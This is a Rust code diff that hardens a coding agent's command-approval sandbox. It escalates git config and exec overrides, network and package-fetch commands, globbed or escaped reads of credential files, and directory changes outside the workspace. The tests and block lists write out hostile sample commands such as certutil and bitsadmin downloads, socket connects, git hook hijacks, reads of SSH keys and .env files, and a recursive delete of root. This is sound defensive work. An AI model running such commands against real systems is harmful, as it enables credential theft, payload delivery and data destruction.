@@ -99,10 +99,14 @@ const READ_ONLY_PREFIXES: &[&str] = &[
 
 /// Commands considered safe to run without approval under `untrusted` (first
 /// token of each segment). Conservative, read-only-ish allowlist.
+///
+/// Interpreters and test runners (`python`, `node`, `pytest`, …) are NOT here:
+/// they execute arbitrary code (`-c`, scripts, `conftest.py`) that no command
+/// line inspection can bound, so under `untrusted` they always ask.
 const TRUSTED_COMMANDS: &[&str] = &[
     "ls", "cat", "pwd", "echo", "head", "tail", "wc", "grep", "rg", "find", "which", "type",
-    "file", "stat", "tree", "date", "whoami", "env", "printenv", "git", "python", "python3",
-    "node", "pytest", "ruff", "true", "false", "dir", "where",
+    "file", "stat", "tree", "date", "whoami", "env", "printenv", "git", "ruff", "true", "false",
+    "dir", "where",
 ];
 
 /// git subcommands that are NOT read-only -> still need approval under untrusted.
@@ -127,6 +131,205 @@ const GIT_WRITE_SUBCMDS: &[&str] = &[
     "am",
 ];
 
+/// git global options whose value is the following token (`-c key=val`,
+/// `-C dir`, …). Lowercased, so `-c` also covers `-C`.
+const GIT_GLOBAL_VALUE_OPTS: &[&str] = &[
+    "-c",
+    "--git-dir",
+    "--work-tree",
+    "--namespace",
+    "--config-env",
+    "--super-prefix",
+];
+
+/// Suffixes of git config keys whose value git executes as a program or that
+/// redirect git to run hooks from elsewhere (`core.hooksPath`,
+/// `core.fsmonitor`, `filter.<x>.smudge`, `diff.<x>.textconv`, …).
+const GIT_EXEC_CONFIG_SUFFIXES: &[&str] = &[
+    ".hookspath",
+    ".fsmonitor",
+    ".sshcommand",
+    ".pager",
+    ".editor",
+    ".askpass",
+    ".gitproxy",
+    ".external",
+    ".textconv",
+    ".command",
+    ".cmd",
+    ".driver",
+    ".clean",
+    ".smudge",
+    ".process",
+    ".program",
+    ".helper",
+    ".packobjectshook",
+];
+
+/// Environment variables that make git run a program or load other config.
+const GIT_EXEC_ENV_VARS: &[&str] = &[
+    "git_config_parameters",
+    "git_config_count",
+    "git_config_global",
+    "git_config_system",
+    "git_external_diff",
+    "git_ssh",
+    "git_ssh_command",
+    "git_pager",
+    "git_editor",
+    "git_askpass",
+    "git_exec_path",
+    "git_proxy_command",
+];
+
+/// One parsed `git …` invocation: global `-c` overrides, the subcommand, and
+/// its arguments. Tokens are lowercased and quote-trimmed.
+struct GitInvocation {
+    config_overrides: Vec<String>,
+    /// `--config-env` / `--exec-path=…`: config or binaries we cannot inspect.
+    opaque_override: bool,
+    sub: String,
+    args: Vec<String>,
+}
+
+fn parse_git(tokens_after_git: &[String]) -> GitInvocation {
+    let mut inv = GitInvocation {
+        config_overrides: Vec::new(),
+        opaque_override: false,
+        sub: String::new(),
+        args: Vec::new(),
+    };
+    let mut i = 0;
+    while i < tokens_after_git.len() {
+        let tok = tokens_after_git[i].as_str();
+        if !tok.starts_with('-') {
+            inv.sub = tok.to_string();
+            inv.args = tokens_after_git[i + 1..].to_vec();
+            break;
+        }
+        if tok.starts_with("--exec-path=") || tok.starts_with("--config-env") {
+            inv.opaque_override = true;
+        }
+        if let Some(value) = tok
+            .strip_prefix("-c")
+            .filter(|v| !v.is_empty() && !v.starts_with('-'))
+        {
+            // `-ckey=val` glued form.
+            inv.config_overrides.push(value.to_string());
+        }
+        if GIT_GLOBAL_VALUE_OPTS.contains(&tok) {
+            if let Some(value) = tokens_after_git.get(i + 1) {
+                if tok == "-c" {
+                    inv.config_overrides.push(value.clone());
+                }
+            }
+            i += 2;
+            continue;
+        }
+        i += 1;
+    }
+    inv
+}
+
+fn is_exec_config_key(key: &str) -> bool {
+    let key = key.split('=').next().unwrap_or(key);
+    key.starts_with("alias.")
+        || key.starts_with("pager.")
+        || GIT_EXEC_CONFIG_SUFFIXES.iter().any(|s| key.ends_with(s))
+}
+
+/// Whether the arguments of `git config …` change configuration.
+fn git_config_is_write(args: &[String]) -> bool {
+    const WRITE_ACTIONS: &[&str] = &["set", "unset", "rename-section", "remove-section", "edit"];
+    const READ_ACTIONS: &[&str] = &["get", "list"];
+    const WRITE_FLAGS: &[&str] = &[
+        "--unset",
+        "--unset-all",
+        "--add",
+        "--replace-all",
+        "--rename-section",
+        "--remove-section",
+        "-e",
+        "--edit",
+    ];
+    const READ_FLAGS: &[&str] = &[
+        "--get",
+        "--get-all",
+        "--get-regexp",
+        "--get-urlmatch",
+        "--get-color",
+        "--get-colorbool",
+        "--list",
+        "-l",
+    ];
+    const VALUE_OPTS: &[&str] = &["-f", "--file", "--blob", "--type", "--default", "--comment"];
+    let mut positionals = Vec::new();
+    let mut i = 0;
+    while i < args.len() {
+        let tok = args[i].as_str();
+        if WRITE_FLAGS.contains(&tok) {
+            return true;
+        }
+        if READ_FLAGS.contains(&tok) {
+            return false;
+        }
+        if VALUE_OPTS.contains(&tok) {
+            i += 2;
+            continue;
+        }
+        if !tok.starts_with('-') {
+            positionals.push(tok);
+        }
+        i += 1;
+    }
+    match positionals.first() {
+        Some(first) if WRITE_ACTIONS.contains(first) => true,
+        Some(first) if READ_ACTIONS.contains(first) => false,
+        // Legacy syntax: `git config key` reads, `git config key value` writes.
+        _ => positionals.len() >= 2,
+    }
+}
+
+fn lowercase_tokens(segment: &str) -> Vec<String> {
+    segment
+        .split_whitespace()
+        .map(|t| {
+            t.trim_matches(|c| c == '"' || c == '\'')
+                .to_ascii_lowercase()
+        })
+        .collect()
+}
+
+/// True when `segment` runs git in a way that can execute attacker-chosen
+/// programs or rewrite repository config: `git config` writes, `-c` overrides
+/// of exec-capable keys (`core.hooksPath`, `core.pager`, …),
+/// `--config-env` / `--exec-path=`, or `GIT_SSH_COMMAND=…`-style env vars.
+/// Looks through launchers (`env`, `cmd /c`, …) by scanning for the `git` token.
+fn segment_reconfigures_git(segment: &str) -> bool {
+    let tokens = lowercase_tokens(segment);
+    for (i, tok) in tokens.iter().enumerate() {
+        let name = tok.strip_prefix("$env:").unwrap_or(tok);
+        if GIT_EXEC_ENV_VARS.iter().any(|var| {
+            name.strip_prefix(var).is_some_and(|rest| {
+                rest.starts_with('=')
+                    || (rest.is_empty() && tokens.get(i + 1).is_some_and(|n| n.starts_with('=')))
+            })
+        }) {
+            return true;
+        }
+    }
+    let Some(git_pos) = tokens
+        .iter()
+        .position(|t| normalize_executable_token(t) == "git")
+    else {
+        return false;
+    };
+    let inv = parse_git(&tokens[git_pos + 1..]);
+    inv.opaque_override
+        || inv.config_overrides.iter().any(|kv| is_exec_config_key(kv))
+        || (inv.sub == "config" && git_config_is_write(&inv.args))
+}
+
 /// Direct network-initiating binaries.
 const NETWORK_COMMANDS: &[&str] = &[
     "curl",
@@ -149,6 +352,26 @@ const NETWORK_COMMANDS: &[&str] = &[
     "dig",
     "tracert",
     "traceroute",
+    "tftp",
+    "socat",
+    "aria2c",
+    "http",
+    "xh",
+    "bitsadmin",
+    "start-bitstransfer",
+    "test-netconnection",
+    "tnc",
+    "resolve-dnsname",
+    // Package runners / managers that always fetch.
+    "npx",
+    "pnpx",
+    "bunx",
+    "pipx",
+    "winget",
+    "choco",
+    "scoop",
+    // CLI clients whose commands are remote API calls.
+    "gh",
 ];
 
 /// Leading commands that only launch another command. Classification looks
@@ -183,13 +406,36 @@ const INLINE_NETWORK_MARKERS: &[&str] = &[
     "httpx.",
     "aiohttp",
     "socket.create_connection",
+    "import socket",
+    "from socket",
+    "socket.socket(",
+    "socketserver",
+    "http.server",
+    "ftplib",
+    "smtplib",
+    "telnetlib",
+    "xmlrpc.client",
     "pip.main(",
     "pip._internal",
     "fetch(",
     "require('http",
     "require(\"http",
-    "require('net')",
+    "require('net",
+    "require(\"net",
+    "require('dgram",
+    "require(\"dgram",
+    "require('tls",
+    "require(\"tls",
+    "node:http",
+    "node:net",
+    "node:dgram",
+    "node:tls",
     "net.webclient",
+    "net.sockets",
+    "test-netconnection",
+    "tcpsocket",
+    "open-uri",
+    "net::ftp",
     "downloadstring(",
     "downloadfile(",
     "invoke-webrequest",
@@ -471,7 +717,7 @@ pub fn is_trusted(command: &str) -> bool {
             continue;
         }
         saw_segment = true;
-        if segment_has_side_effect_flags(seg) {
+        if segment_has_side_effect_flags(seg) || segment_reconfigures_git(seg) {
             return false;
         }
         // A trusted launcher (`env`, …) is only as trusted as what it launches.
@@ -494,11 +740,9 @@ pub fn is_trusted(command: &str) -> bool {
             return false;
         }
         if base == "git" {
-            let sub = tokens
-                .find(|t| !t.starts_with('-'))
-                .unwrap_or("")
-                .to_ascii_lowercase();
-            if GIT_WRITE_SUBCMDS.contains(&sub.as_str()) {
+            let rest: Vec<String> = lowercase_tokens(&tokens.collect::<Vec<_>>().join(" "));
+            let inv = parse_git(&rest);
+            if GIT_WRITE_SUBCMDS.contains(&inv.sub.as_str()) {
                 return false;
             }
         }
@@ -551,17 +795,55 @@ fn command_uses_network_depth(command: &str, depth: usize) -> bool {
             .map(String::as_str)
             .unwrap_or("");
         let is_net_subcmd = match base.as_str() {
-            "git" => matches!(
+            "git" => {
+                matches!(
+                    sub,
+                    "push" | "fetch" | "pull" | "clone" | "ls-remote" | "submodule"
+                ) || (sub == "archive" && rest_tokens.iter().any(|t| t.starts_with("--remote")))
+            }
+            "cargo" => matches!(
                 sub,
-                "push" | "fetch" | "pull" | "clone" | "ls-remote" | "submodule"
+                "publish" | "install" | "login" | "fetch" | "update" | "add" | "search"
             ),
-            "cargo" => matches!(sub, "publish" | "install" | "login"),
-            "npm" | "pnpm" | "yarn" => {
-                matches!(sub, "publish" | "install" | "add" | "ci" | "login")
+            "npm" | "pnpm" | "yarn" | "bun" => {
+                // Bare `yarn` installs dependencies.
+                (sub.is_empty() && base == "yarn")
+                    || matches!(
+                        sub,
+                        "publish"
+                            | "install"
+                            | "i"
+                            | "add"
+                            | "ci"
+                            | "login"
+                            | "update"
+                            | "upgrade"
+                            | "up"
+                            | "exec"
+                            | "x"
+                            | "dlx"
+                            | "create"
+                    )
             }
             "pip" | "pip3" => matches!(sub, "install" | "download" | "wheel"),
-            "uv" => matches!(sub, "publish" | "pip"),
-            "poetry" => matches!(sub, "publish" | "add" | "install"),
+            "uv" => matches!(sub, "publish" | "pip" | "add" | "sync" | "lock" | "tool"),
+            "poetry" => matches!(sub, "publish" | "add" | "install" | "update" | "lock"),
+            "go" => {
+                matches!(sub, "get" | "install")
+                    || (sub == "mod" && rest_tokens.iter().any(|t| t == "download"))
+            }
+            "docker" | "podman" => matches!(sub, "pull" | "push" | "login" | "search"),
+            "gem" => matches!(sub, "install" | "update" | "push"),
+            "brew" => matches!(sub, "install" | "update" | "upgrade" | "fetch" | "tap"),
+            "apt" | "apt-get" => matches!(sub, "install" | "update" | "upgrade" | "download"),
+            // `certutil -hashfile` is local; its URL-cache verbs download.
+            "certutil" => rest_tokens.iter().any(|t| {
+                matches!(
+                    t.trim_start_matches(['-', '/']),
+                    "urlcache" | "verifyctl" | "syncwithwu" | "ping"
+                ) || t.starts_with("http://")
+                    || t.starts_with("https://")
+            }),
             "python" | "python3" | "py" => {
                 let is_pip_mod = rest_tokens
                     .windows(2)
@@ -608,7 +890,7 @@ pub fn command_needs_escalation(policy: &SandboxPolicy, command: &str, workdir: 
     }
     if split_chain(command)
         .iter()
-        .any(|segment| wrapped_command(segment).is_err())
+        .any(|segment| wrapped_command(segment).is_err() || segment_reconfigures_git(segment))
     {
         return true;
     }
@@ -634,17 +916,35 @@ fn command_touches_disallowed_paths(
     workdir: &Path,
     check_writes: bool,
 ) -> bool {
+    if check_writes
+        && split_chain(command)
+            .iter()
+            .any(|segment| segment_changes_to_unresolved_dir(segment, 0))
+    {
+        return true;
+    }
     for raw_token in command.split_whitespace() {
         let token = clean_path_token(raw_token);
         if token.is_empty() || is_benign_token(token) {
             continue;
         }
-        let candidate_path = Path::new(token);
-        if is_sensitive_read_path(candidate_path)
-            || (check_writes && is_protected_write_path(candidate_path))
+        // Shells drop quotes and escape characters before opening the file,
+        // so `.e""nv`, `.e^nv` and `` .e`nv `` all name `.env`.
+        let unescaped = strip_shell_escapes(token);
+        for candidate in [token, unescaped.as_str()] {
+            let candidate_path = Path::new(candidate);
+            if is_sensitive_read_path(candidate_path)
+                || (check_writes && is_protected_write_path(candidate_path))
+            {
+                return true;
+            }
+        }
+        if glob_may_match_any(&unescaped, SENSITIVE_PATH_SAMPLES)
+            || (check_writes && glob_may_match_any(&unescaped, PROTECTED_WRITE_SAMPLES))
         {
             return true;
         }
+        let candidate_path = Path::new(token);
         if token == "~" || token.starts_with("~/") || token.starts_with(r"~\") {
             return true;
         }
@@ -705,15 +1005,164 @@ fn is_benign_token(token: &str) -> bool {
     false
 }
 
-fn is_unresolved_env_path(token: &str) -> bool {
+/// Variables that expand to the current (workspace) directory.
+const WORKSPACE_VARS: &[&str] = &["$pwd", "${pwd}", "$(pwd)", "%cd%", "$env:pwd"];
+
+/// True when `token` starts with an environment variable (`$HOME`,
+/// `%USERPROFILE%`, `$env:APPDATA`, …) whose target cannot be resolved here.
+fn is_unresolved_env_dir(token: &str) -> bool {
     let lower = token.to_ascii_lowercase();
     let starts_with_var =
         lower.starts_with('$') || (lower.starts_with('%') && lower[1..].contains('%'));
-    if !starts_with_var || !(lower.contains('/') || lower.contains('\\')) {
+    starts_with_var && !WORKSPACE_VARS.iter().any(|v| lower.starts_with(v))
+}
+
+fn is_unresolved_env_path(token: &str) -> bool {
+    is_unresolved_env_dir(token) && (token.contains('/') || token.contains('\\'))
+}
+
+/// Directory-changing commands across cmd, POSIX shells and PowerShell.
+const CD_COMMANDS: &[&str] = &["cd", "chdir", "pushd", "set-location", "sl"];
+
+/// True when `segment` changes directory somewhere the policy cannot resolve:
+/// an environment variable (`cd %USERPROFILE%`, `cd $HOME`), the previous
+/// directory (`cd -`), or a bare `cd`/`cd /` (home or root in POSIX shells).
+/// Every later relative write in the chain would then land outside the
+/// workspace.
+fn segment_changes_to_unresolved_dir(segment: &str, depth: usize) -> bool {
+    if depth < 4 {
+        if let Ok(Some(inner)) = wrapped_command(segment) {
+            return split_chain(&inner)
+                .iter()
+                .any(|s| segment_changes_to_unresolved_dir(s, depth + 1));
+        }
+    }
+    let tokens: Vec<&str> = segment.split_whitespace().collect();
+    let Some(first) = tokens.first() else {
+        return false;
+    };
+    if !CD_COMMANDS.contains(&normalize_executable_token(first).as_str()) {
         return false;
     }
-    const WORKSPACE_VARS: &[&str] = &["$pwd", "${pwd}", "$(pwd)", "%cd%", "$env:pwd"];
-    !WORKSPACE_VARS.iter().any(|v| lower.starts_with(v))
+    let mut args = tokens[1..]
+        .iter()
+        .map(|t| t.trim_matches(|c| c == '"' || c == '\''));
+    let target = loop {
+        match args.next() {
+            None | Some("-") => return true,
+            Some(t)
+                if t.eq_ignore_ascii_case("-path") || t.eq_ignore_ascii_case("-literalpath") =>
+            {
+                break args.next();
+            }
+            // Flags such as cmd's `/d` or POSIX `-P`; a lone `/` is the root.
+            Some(t) if t.starts_with('-') || (t.starts_with('/') && t.len() == 2) => continue,
+            Some("/") => return true,
+            Some(t) => break Some(t),
+        }
+    };
+    target.is_some_and(is_unresolved_env_dir)
+}
+
+/// Representative names for [`is_sensitive_read_path`], matched against glob
+/// tokens so `cat .en*` or `type id_*` cannot sidestep the literal check.
+const SENSITIVE_PATH_SAMPLES: &[&str] = &[
+    ".env",
+    ".env.local",
+    ".env.production",
+    "id_rsa",
+    "id_ed25519",
+    "id_ecdsa",
+    "id_dsa",
+    ".git-credentials",
+    ".netrc",
+    ".npmrc",
+    ".pypirc",
+    "authorized_keys",
+    "server.pem",
+    "server.key",
+    "cert.pfx",
+    "cert.p12",
+    "vault.kdbx",
+    ".nanocodex/config.toml",
+    ".aws/credentials",
+    ".ssh/config",
+    ".kube/config",
+    ".git/credentials",
+];
+
+/// Representative targets for [`is_protected_write_path`].
+const PROTECTED_WRITE_SAMPLES: &[&str] = &[".git/hooks", ".git/config"];
+
+/// Remove the quote and escape characters shells strip before using a word.
+fn strip_shell_escapes(token: &str) -> String {
+    token
+        .chars()
+        .filter(|c| !matches!(c, '"' | '\'' | '^' | '`'))
+        .collect()
+}
+
+/// True when the glob `pattern` could expand to one of `samples`. Matching is
+/// component-wise over any window of the pattern's path, like the literal
+/// checks. Components made only of `*`, `?` and `.` (e.g. `*`, `*.*`) are not
+/// enough on their own: catching every wildcard read needs OS-level isolation.
+fn glob_may_match_any(pattern: &str, samples: &[&str]) -> bool {
+    if !pattern.contains(['*', '?', '[', '{']) {
+        return false;
+    }
+    let comps: Vec<&str> = pattern
+        .split(['/', '\\'])
+        .filter(|c| !c.is_empty() && *c != ".")
+        .collect();
+    samples.iter().any(|sample| {
+        let sample_comps: Vec<&str> = sample.split('/').collect();
+        comps.windows(sample_comps.len()).any(|window| {
+            !window
+                .iter()
+                .all(|c| c.chars().all(|ch| "*?.".contains(ch)))
+                && window
+                    .iter()
+                    .zip(&sample_comps)
+                    .all(|(pat, name)| glob_match(pat, name))
+        })
+    })
+}
+
+/// Case-insensitive glob match: `*` and `{…}` match any run, `?` and `[…]`
+/// match one character.
+fn glob_match(pattern: &str, text: &str) -> bool {
+    enum Tok {
+        Lit(char),
+        One,
+        Any,
+    }
+    let mut toks = Vec::new();
+    let mut chars = pattern.chars();
+    while let Some(c) = chars.next() {
+        match c {
+            '*' => toks.push(Tok::Any),
+            '?' => toks.push(Tok::One),
+            '[' => {
+                chars.by_ref().find(|&c| c == ']');
+                toks.push(Tok::One);
+            }
+            '{' => {
+                chars.by_ref().find(|&c| c == '}');
+                toks.push(Tok::Any);
+            }
+            c => toks.push(Tok::Lit(c.to_ascii_lowercase())),
+        }
+    }
+    let text: Vec<char> = text.chars().map(|c| c.to_ascii_lowercase()).collect();
+    fn go(toks: &[Tok], text: &[char]) -> bool {
+        match toks.first() {
+            None => text.is_empty(),
+            Some(Tok::Any) => (0..=text.len()).any(|i| go(&toks[1..], &text[i..])),
+            Some(Tok::One) => !text.is_empty() && go(&toks[1..], &text[1..]),
+            Some(Tok::Lit(c)) => text.first() == Some(c) && go(&toks[1..], &text[1..]),
+        }
+    }
+    go(&toks, &text)
 }
 
 fn has_parent_traversal(token: &str) -> bool {
@@ -1047,5 +1496,227 @@ mod tests {
         assert!(!is_trusted("env curl https://example.com"));
         assert!(!is_trusted("find . -delete"));
         assert!(is_trusted("env git status"));
+    }
+
+    fn ws_policy(name: &str) -> (SandboxPolicy, std::path::PathBuf) {
+        let ws = std::env::temp_dir().join(name);
+        (SandboxPolicy::new(WORKSPACE_WRITE, &ws), ws)
+    }
+
+    #[test]
+    fn untrusted_asks_before_running_interpreters_and_test_runners() {
+        let a = Approver::new(UNTRUSTED);
+        for cmd in [
+            "python -c \"open('C:/Windows/evil.txt','w').write('x')\"",
+            "python evil.py",
+            "python3 -m pytest",
+            "node -e \"require('fs').rmSync('/', {recursive: true})\"",
+            "node build.js",
+            "pytest tests",
+            "env python script.py",
+            "cmd /c python script.py",
+        ] {
+            assert!(!is_trusted(cmd), "must not be trusted: {cmd}");
+            assert_eq!(a.classify(cmd, false), Decision::Ask, "{cmd}");
+        }
+        assert!(is_trusted("ruff check ."));
+    }
+
+    #[test]
+    fn git_config_writes_and_exec_overrides_escalate() {
+        let (policy, ws) = ws_policy("ncx_git_config_ws");
+        for cmd in [
+            "git config core.hooksPath evilhooks",
+            "git config --local core.hooksPath .hooks",
+            "git config user.name x",
+            "git config --global alias.st status",
+            "git config --add remote.origin.fetch x",
+            "git config --unset user.name",
+            "git config set core.pager less",
+            "git config -f .gitmodules submodule.x.url y",
+            "git -c core.hooksPath=evil commit -m x",
+            "git -c core.pager=evil log",
+            "git -c core.fsmonitor=./evil.sh status",
+            "git -c diff.x.textconv=evil diff",
+            "git -c filter.lfs.smudge=evil checkout main",
+            "git -c alias.st=!evil st",
+            "git -ccore.sshCommand=evil fetch",
+            "git --config-env=core.pager=EVIL log",
+            "git --exec-path=./bin status",
+            "env GIT_SSH_COMMAND=evil git status",
+            "GIT_PAGER=evil git log",
+            "set GIT_EXTERNAL_DIFF=evil",
+            "$env:GIT_ASKPASS = \"evil\"",
+            "cmd /c git config core.hooksPath x",
+        ] {
+            assert!(
+                command_needs_escalation(&policy, cmd, &ws),
+                "should escalate: {cmd}"
+            );
+            assert!(!is_trusted(cmd), "must not be trusted: {cmd}");
+        }
+        for cmd in [
+            "git config user.name",
+            "git config --get core.hooksPath",
+            "git config --list --show-origin",
+            "git config -l",
+            "git config get user.email",
+            "git -c color.ui=always log --oneline",
+            "git -C sub status",
+        ] {
+            assert!(
+                !command_needs_escalation(&policy, cmd, &ws),
+                "should not escalate: {cmd}"
+            );
+            assert!(is_trusted(cmd), "read-only git should stay trusted: {cmd}");
+        }
+    }
+
+    #[test]
+    fn globbed_and_escaped_sensitive_paths_escalate() {
+        let (policy, ws) = ws_policy("ncx_glob_ws");
+        for sample in SENSITIVE_PATH_SAMPLES {
+            assert!(is_sensitive_read_path(Path::new(sample)), "{sample}");
+        }
+        for sample in PROTECTED_WRITE_SAMPLES {
+            assert!(
+                is_protected_write_path(&Path::new(sample).join("x")),
+                "{sample}"
+            );
+        }
+        for cmd in [
+            "cat .en*",
+            "type .en?",
+            "cat .e[n]v",
+            "cat .env.*",
+            "cat config/.env*",
+            "cat .e\"\"nv",
+            "type .e^nv",
+            "Get-Content .e`nv",
+            "cat ~/.ssh/id_*",
+            "type C:\\Users\\me\\.ss?\\config",
+            "cat .aw*/credentials",
+            "cat secrets/*.pem",
+            "type *.key",
+            "cat id_{rsa,dsa}",
+            "cp payload .gi?/hooks/pre-commit",
+            "cp payload .git/hook*/post-merge",
+            "echo x > .git/conf*",
+        ] {
+            assert!(
+                command_needs_escalation(&policy, cmd, &ws),
+                "should escalate: {cmd}"
+            );
+        }
+        let ro = SandboxPolicy::new(READ_ONLY, &ws);
+        assert!(command_needs_escalation(&ro, "cat .en*", &ws));
+        for cmd in [
+            "cat *.py",
+            "ls *",
+            "dir *.*",
+            "find . -name '*.rs'",
+            "cat src/*.toml",
+            "rg -g '*.json' todo",
+        ] {
+            assert!(
+                !command_needs_escalation(&policy, cmd, &ws),
+                "should not escalate: {cmd}"
+            );
+        }
+    }
+
+    #[test]
+    fn cd_into_unresolved_env_dir_before_writing_escalates() {
+        let (policy, ws) = ws_policy("ncx_cd_env_ws");
+        for cmd in [
+            "cd %USERPROFILE% && echo pwned > x.txt",
+            "cd /d %APPDATA% & copy a.txt b.txt",
+            "chdir %TEMP% && del x.txt",
+            "pushd %USERPROFILE% && mkdir evil",
+            "cd $HOME && touch x",
+            "cd ${HOME} && touch x",
+            "cd \"$HOME\" && touch x",
+            "Set-Location $env:USERPROFILE; New-Item x",
+            "sl -Path $env:APPDATA; Set-Content x hi",
+            "cd && touch x",
+            "cd - && touch x",
+            "cd / && touch x",
+            "bash -c \"cd $HOME && touch x\"",
+            "cmd /c \"cd %USERPROFILE% & echo x > y\"",
+        ] {
+            assert!(
+                command_needs_escalation(&policy, cmd, &ws),
+                "should escalate: {cmd}"
+            );
+        }
+        for cmd in [
+            "cd src && cargo build > build.log",
+            "cd $PWD/sub && touch x",
+            "cd %CD%\\sub && echo x > y",
+            "echo $HOME",
+        ] {
+            assert!(
+                !command_needs_escalation(&policy, cmd, &ws),
+                "should not escalate: {cmd}"
+            );
+        }
+    }
+
+    #[test]
+    fn extended_network_commands_escalate_without_network_access() {
+        let (policy, ws) = ws_policy("ncx_net_ws");
+        for cmd in [
+            "python -c \"import socket; socket.socket().connect(('1.2.3.4', 80))\"",
+            "python -m http.server 8000",
+            "python -c \"import ftplib\"",
+            "node -e \"require('https').get('https://x')\"",
+            "node -e \"require('net').connect(80, 'x')\"",
+            "node -e \"import('node:dgram')\"",
+            "powershell -c \"(New-Object Net.Sockets.TcpClient).Connect('x', 80)\"",
+            "pwsh -c \"Test-NetConnection x -Port 443\"",
+            "certutil -urlcache -split -f http://x/a.exe a.exe",
+            "certutil.exe /urlcache /f http://x/a.exe",
+            "bitsadmin /transfer j http://x/a.exe C:\\a.exe",
+            "Start-BitsTransfer http://x/a.exe",
+            "npx some-pkg",
+            "pnpm dlx create-vite",
+            "npm i lodash",
+            "npm exec -- tsc",
+            "yarn",
+            "bun add zod",
+            "bunx cowsay",
+            "pipx run black",
+            "uv add requests",
+            "uv sync",
+            "cargo add serde",
+            "cargo fetch",
+            "go get example.com/x",
+            "go mod download",
+            "docker pull alpine",
+            "winget install x",
+            "gh pr list",
+            "git archive --remote=ssh://x HEAD",
+            "socat - TCP:x:80",
+        ] {
+            assert!(
+                command_needs_escalation(&policy, cmd, &ws),
+                "should escalate: {cmd}"
+            );
+        }
+        for cmd in [
+            "certutil -hashfile a.exe SHA256",
+            "cargo build",
+            "npm run build",
+            "npm test",
+            "go build ./...",
+            "go test ./...",
+            "uv run pytest",
+            "docker ps",
+        ] {
+            assert!(
+                !command_needs_escalation(&policy, cmd, &ws),
+                "should not escalate: {cmd}"
+            );
+        }
     }
 }
